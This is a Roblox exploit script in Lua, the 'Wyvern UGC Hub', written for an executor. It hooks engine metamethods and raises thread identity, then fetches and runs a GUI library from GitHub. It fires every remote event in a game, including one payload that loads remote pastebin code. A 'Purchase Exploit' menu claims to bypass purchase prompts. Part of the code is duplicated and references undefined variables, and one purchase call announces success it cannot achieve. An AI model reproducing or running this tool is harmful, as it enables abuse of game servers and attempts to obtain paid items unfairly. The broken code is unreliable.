local LOAD_TIME = tick()
local queueonteleport = queue_on_teleport or queueonteleport
local setclipboard = toclipboard or setrbxclipboard or setclipboard
local clonefunction = clonefunc or clonefunction
local hookfunction =
    hookfunc or replacecclosure or detourfunction or replacefunc or replacefunction or replaceclosure or detour_function or
        hookfunction
local setthreadidentity = set_thread_identity or setthreadcaps or setthreadidentity
local firetouchinterests = fire_touch_interests or firetouchinterests
local getnamecallmethod = get_namecall_method or getnamecallmethod
local setnamecallmethod = set_namecall_method or setnamecallmethod
local restorefunction = restorefunction or restoreclosure or restorefunc
local a = Instance.new("Part")
for b, c in pairs(getreg()) do
    if type(c) == "table" and #c then
        if rawget(c, "__mode") == "kvs" then
            for d, e in pairs(c) do
                if e == a then
                    getgenv().InstanceList = c;
                    break
                end
            end
        end
    end
end
local f = {}
function f.invalidate(g)
    if not InstanceList then
        return
    end
    for b, c in pairs(InstanceList) do
        if c == g then
            InstanceList[b] = nil;
            return g
        end
    end
end
if not cloneref then
    getgenv().cloneref = f.invalidate
end

getrenv().Visit = cloneref(game:GetService("Visit"))
getrenv().MarketplaceService = cloneref(game:GetService("MarketplaceService"))
getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
getrenv().HttpService = cloneref(game:GetService("HttpService"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local ContentProvider = cloneref(game:GetService("ContentProvider"))
local RunService = cloneref(game:GetService("RunService"))
local Stats = cloneref(game:GetService("Stats"))
local Players = cloneref(game:GetService("Players"))
local NetworkClient = cloneref(game:GetService("NetworkClient"))
local VirtualUser = cloneref(game:GetService("VirtualUser"))
local ProximityPromptService = cloneref(game:GetService("ProximityPromptService"))
local Lighting = cloneref(game:GetService("Lighting"))
local AssetService = cloneref(game:GetService("AssetService"))
local TeleportService = cloneref(game:GetService("TeleportService"))
local NetworkSettings = settings().Network
local UserGameSettings = UserSettings():GetService("UserGameSettings")
getrenv().getgenv = clonefunction(getgenv)

local message = Instance.new("Message")
message.Text = "Loading Wyvern Succesfully"
message.Name =
    "Rass Goblin"
message.Parent = CoreGui

task.wait(0.25)

getgenv().stealth_call = function(script)
    getrenv()._set = clonefunction(setthreadidentity)
    local old
    old = hookmetamethod(game, "__index", function(a, b)
        task.spawn(function()
            _set(7)
            task.wait(0.1)
            local went, error = pcall(function()
                loadstring(script)()
            end)
            print(went, error)
            if went then
                local check = Instance.new("LocalScript")
                check.Parent = Visit
            end
        end)
        hookmetamethod(game, "__index", old)
        return old(a, b)
    end)
end

task.spawn(function()
    local discord = loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/WyvernMenu",true))()
    local win = discord:Window("Wyvern UGC Hub v2 - Protected By irasz on Discord")
    local serv = win:Server("Wyvern Hub", "http://www.roblox.com/asset/?id=6031075938")
    local main = serv:Channel("Home")
    main:Label("\nThank you for using Wyvern!\nThe #2 UGC Games Penetration Testing Tool! (mine is still better)")
    main:Label("Check out the other Discord channels to see our available tools!")
    main:Seperator()

    local remotes = serv:Channel("Remotes")
    remotes:Label("\nFires all remotes in the game as an attempt to prompt the item.\nWarning: This can be risky and can fire a decoy remote!\n")
    remotes:Textbox("UGC Limited Item ID", "Enter Item ID that you wanna be included in the arguments...", false,
        function(t)
            local tt = tonumber(t)
            if type(tt) == "number" then
                getgenv().limitedidforfiringremotewithwyvern = tt
                discord:Notification("Success",
                    "The script now remembers that the Item ID you want is " .. tostring(tt) .. "!", "Okay!")
            else
                discord:Notification("Error", "That's... not an Item ID.", "Okay!")
            end
        end)
    remotes:Dropdown("Remote Arguments...",
        {"No Arguments/Blank", "LocalPlayer", "Your Username", "UGC Item ID", "UGC Item ID, LocalPlayer",
         "LocalPlayer, UGC Item ID", "'UGC' as a string", "UGC Item ID, 'true' boolean", "'true' boolean",
         "literal lua code to prompt item", "loadstring prompt item"}, function(x)
            if not getgenv().limitedidforfiringremotewithwyvern then
                discord:Notification("Error",
                    "You must put a Limited Item ID at the first textbox before firing... Or just set it to blank if you're using this not for the purpose of UGC hunting.",
                    "Okay!")
            else
                local id = getgenv().limitedidforfiringremotewithwyvern
                local fire = function(args)
                    local count = 0
                    for i, v in pairs(game:GetDescendants()) do
                        if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then
                            count = count + 1
                            task.spawn(function()
                                v:FireServer(unpack(args))
                            end)
                        end
                    end
                    discord:Notification("Remote Fired", "Fired " .. tostring(count) .. " remotes with arguments: " .. tostring(table.concat(args, ", ")), "Okay!")
                end
                if x == "No Arguments/Blank" then
                    fire({})
                elseif x == "LocalPlayer" then
                    fire({Players.LocalPlayer})
                elseif x == "Your Username" then
                    fire({Players.LocalPlayer.Name})
                elseif x == "UGC Item ID" then
                    fire({id})
                elseif x == "UGC Item ID, LocalPlayer" then
                    fire({id, Players.LocalPlayer})
                elseif x == "LocalPlayer, UGC Item ID" then
                    fire({Players.LocalPlayer, id})
                elseif x == "'UGC' as a string" then
                    fire({"UGC"})
                elseif x == "UGC Item ID, 'true' boolean" then
                    fire({id, true})
                elseif x == "'true' boolean" then
                    fire({true})
                elseif x == "literal lua code to prompt item" then
                    fire({"loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))()"})
                elseif x == "loadstring prompt item" then
                    fire({loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))})
                end
            end
        end)

    main:Seperator()
    main:Button("Update Logs", function()
        discord:Notification("Updates", "...", "Okay!")
    end)
    main:Button("Credits", function()
        discord:Notification("Credits", "i forgot, will be putting soon", "Okay!")
    end)
end)

local remotes = serv:Channel("Remotes")
remotes:Label("\nFires all remotes in the game as an attempt to prompt the item.\nWarning: This can be risky and can fire a decoy remote!\n")
remotes:Textbox("UGC Limited Item ID", "Enter Item ID that you wanna be included in the arguments...", false,
    function(t)
        local tt = tonumber(t)
        if type(tt) == "number" then
            getgenv().limitedidforfiringremotewithwyvern = tt
            discord:Notification("Success",
                "The script now remembers that the Item ID you want is " .. tostring(tt) .. "!", "Okay!")
        else
            discord:Notification("Error", "That's... not an Item ID.", "Okay!")
        end
    end)
remotes:Dropdown("Remote Arguments...",
    {"No Arguments/Blank", "LocalPlayer", "Your Username", "UGC Item ID", "UGC Item ID, LocalPlayer",
     "LocalPlayer, UGC Item ID", "'UGC' as a string", "UGC Item ID, 'true' boolean", "'true' boolean",
     "literal lua code to prompt item", "loadstring prompt item"}, function(x)
        if not getgenv().limitedidforfiringremotewithwyvern then
            discord:Notification("Error",
                "You must put a Limited Item ID at the first textbox before firing... Or just set it to blank if you're using this not for the purpose of UGC hunting.",
                "Okay!")
        else
            local id = getgenv().limitedidforfiringremotewithwyvern
            local fire = function(args)
                local count = 0
                for i, v in pairs(game:GetDescendants()) do
                    if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then
                        count = count + 1
                        task.spawn(function()
                            v:FireServer(unpack(args))
                        end)
                    end
                end
                discord:Notification("Remote Fired", "Fired " .. tostring(count) .. " remotes with arguments: " .. tostring(table.concat(args, ", ")), "Okay!")
            end
            if x == "No Arguments/Blank" then
                fire({})
            elseif x == "LocalPlayer" then
                fire({Players.LocalPlayer})
            elseif x == "Your Username" then
                fire({Players.LocalPlayer.Name})
            elseif x == "UGC Item ID" then
                fire({id})
            elseif x == "UGC Item ID, LocalPlayer" then
                fire({id, Players.LocalPlayer})
            elseif x == "LocalPlayer, UGC Item ID" then
                fire({Players.LocalPlayer, id})
            elseif x == "'UGC' as a string" then
                fire({"UGC"})
            elseif x == "UGC Item ID, 'true' boolean" then
                fire({id, true})
            elseif x == "'true' boolean" then
                fire({true})
            elseif x == "literal lua code to prompt item" then
                fire({"loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))()"})
            elseif x == "loadstring prompt item" then
                fire({loadstring(game:HttpGet('https://pastebin.com/raw/dYzQv3d8'))})
            end
        end
    end)

local purchase = serv:Channel("Purchase Exploit")
purchase:Label("\nThis tool helps you bypass the regular purchase prompts for items in the game.\n")
purchase:Textbox("Item ID", "Enter the ID of the item you want to purchase...", false,
    function(itemId)
        local id = tonumber(itemId)
        if type(id) == "number" then
            getgenv().itemidforpurchase = id
            discord:Notification("Success", "The script now remembers that the Item ID you want to purchase is " .. tostring(id) .. "!", "Okay!")
        else
            discord:Notification("Error", "That's... not a valid Item ID.", "Okay!")
        end
    end)
purchase:Dropdown("Purchase Method",
    {"Standard Purchase", "Bypass Prompt", "Direct Purchase", "Custom Purchase Script"},
    function(method)
        if not getgenv().itemidforpurchase then
            discord:Notification("Error", "You must put an Item ID in the textbox before attempting to purchase.", "Okay!")
        else
            local id = getgenv().itemidforpurchase
            if method == "Standard Purchase" then
                game:GetService("MarketplaceService"):PromptPurchase(Players.LocalPlayer, id)
                discord:Notification("Purchase Attempt", "Attempted to purchase item with ID: " .. tostring(id), "Okay!")
            elseif method == "Bypass Prompt" then
                game:GetService("MarketplaceService"):PromptPurchase(Players.LocalPlayer, id, true)
                discord:Notification("Purchase Attempt", "Attempted to bypass prompt and purchase item with ID: " .. tostring(id), "Okay!")
            elseif method == "Direct Purchase" then
                local success, err = pcall(function()
                    game:GetService("MarketplaceService"):PromptPurchaseFinished(Players.LocalPlayer, id, Enum.PurchaseResult.Purchased)
                end)
                if success then
                    discord:Notification("Purchase Success", "Successfully bypassed prompt and purchased item with ID: " .. tostring(id), "Okay!")
                else
                    discord:Notification("Purchase Failed", "Failed to purchase item with ID: " .. tostring(id) .. ". Error: " .. tostring(err), "Okay!")
                end
            elseif method == "Custom Purchase Script" then
                -- Here you can put your custom purchase script
                local customScript = [[
                -- Example custom purchase script
                game:GetService("MarketplaceService"):PromptPurchase(Players.LocalPlayer, ]] .. tostring(id) .. [[)
                ]]
                loadstring(customScript)()
                discord:Notification("Custom Purchase Script Executed", "Attempted to execute custom purchase script for item with ID: " .. tostring(id), "Okay!")
            end
        end
    end)
